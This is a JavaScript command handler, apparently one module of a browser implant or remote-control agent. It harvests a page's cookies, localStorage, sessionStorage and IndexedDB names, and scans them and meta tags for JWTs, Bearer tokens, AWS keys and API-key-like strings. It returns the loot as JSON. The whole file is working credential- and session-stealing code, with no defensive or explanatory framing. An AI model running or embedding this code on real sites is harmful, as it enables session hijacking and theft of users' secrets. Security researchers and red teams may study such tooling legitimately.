COMMANDS['storage'] = async function(task) {
    var result = {
        domain: window.location.hostname,
        origin: window.location.origin,
        path: window.location.pathname,
        protocol: window.location.protocol
    };

    // --- Cookies ---
    var raw = document.cookie;
    var cookies = [];
    if (raw) {
        var pairs = raw.split(';');
        for (var i = 0; i < pairs.length; i++) {
            var eq = pairs[i].indexOf('=');
            if (eq > -1) {
                cookies.push({
                    name: pairs[i].substring(0, eq).trim(),
                    value: pairs[i].substring(eq + 1).trim()
                });
            }
        }
    }
    result.cookies = {count: cookies.length, items: cookies, raw: raw || ''};

    // --- localStorage ---
    var ls = [];
    try {
        for (var k = 0; k < localStorage.length; k++) {
            var key = localStorage.key(k);
            var val = localStorage.getItem(key);
            ls.push({key: key, value: val, length: val ? val.length : 0});
        }
    } catch (e) {
        ls = [{error: e.message}];
    }
    result.localStorage = {count: ls.length, items: ls};

    // --- sessionStorage ---
    var ss = [];
    try {
        for (var j = 0; j < sessionStorage.length; j++) {
            var skey = sessionStorage.key(j);
            var sval = sessionStorage.getItem(skey);
            ss.push({key: skey, value: sval, length: sval ? sval.length : 0});
        }
    } catch (e) {
        ss = [{error: e.message}];
    }
    result.sessionStorage = {count: ss.length, items: ss};

    // --- IndexedDB database names ---
    var idbNames = [];
    try {
        if (indexedDB.databases) {
            var dbs = await indexedDB.databases();
            for (var d = 0; d < dbs.length; d++) {
                idbNames.push({name: dbs[d].name, version: dbs[d].version});
            }
        }
    } catch (e) {}
    result.indexedDB = {count: idbNames.length, databases: idbNames};

    // --- Interesting token patterns ---
    var tokens = [];
    var tokenPatterns = [
        {name: 'JWT', pattern: /^eyJ[A-Za-z0-9_-]+\.eyJ[A-Za-z0-9_-]+/},
        {name: 'Bearer', pattern: /^Bearer\s+\S+/i},
        {name: 'AWS Key', pattern: /AKIA[0-9A-Z]{16}/},
        {name: 'API Key', pattern: /[a-f0-9]{32,}/i}
    ];

    function scanValue(source, key, val) {
        if (!val || typeof val !== 'string') return;
        for (var t = 0; t < tokenPatterns.length; t++) {
            if (tokenPatterns[t].pattern.test(val)) {
                tokens.push({
                    source: source,
                    key: key,
                    type: tokenPatterns[t].name,
                    preview: val.substring(0, 80) + (val.length > 80 ? '...' : '')
                });
            }
        }
    }

    // Scan cookies
    for (var ci = 0; ci < cookies.length; ci++) {
        scanValue('cookie', cookies[ci].name, cookies[ci].value);
    }
    // Scan localStorage
    for (var li = 0; li < ls.length; li++) {
        if (!ls[li].error) scanValue('localStorage', ls[li].key, ls[li].value);
    }
    // Scan sessionStorage
    for (var si = 0; si < ss.length; si++) {
        if (!ss[si].error) scanValue('sessionStorage', ss[si].key, ss[si].value);
    }
    // Scan meta tags
    var metas = document.querySelectorAll('meta[name], meta[property]');
    for (var m = 0; m < metas.length; m++) {
        var mname = metas[m].getAttribute('name') || metas[m].getAttribute('property');
        var mcontent = metas[m].getAttribute('content');
        scanValue('meta', mname, mcontent);
    }

    result.interestingTokens = {count: tokens.length, items: tokens};

    return JSON.stringify(result, null, 2);
};
